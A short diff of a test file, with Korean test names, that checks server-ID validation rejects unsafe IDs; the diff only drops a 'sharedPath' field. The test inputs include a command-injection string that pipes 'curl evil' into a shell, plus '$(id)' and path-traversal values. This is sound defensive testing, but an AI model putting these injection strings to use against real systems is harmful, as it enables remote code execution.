@@ -55,7 +55,7 @@ test('같은 IP에서 여러 아이디로 20번 틀리면 IP가 잠긴다', asyn
 });
 
 test('서버 ID는 글자·숫자·._- 만 허용한다', () => {
-  const base = { name: 'x', type: 'WEB', roles: ['OTHER'], os: 'Linux', ip: '10.0.0.1', sharedPath: '', processes: [], directories: [] };
+  const base = { name: 'x', type: 'WEB', roles: ['OTHER'], os: 'Linux', ip: '10.0.0.1', processes: [], directories: [] };
   for (const id of ["a'; curl evil | sh; '", 'a b', '../x', '.hidden', 'a/b', 'a\\b', '$(id)', 'x'.repeat(65)]) {
     assert.throws(() => createServer({ ...base, id } as any), /서버 ID는 글자·숫자로 시작/, id);
   }
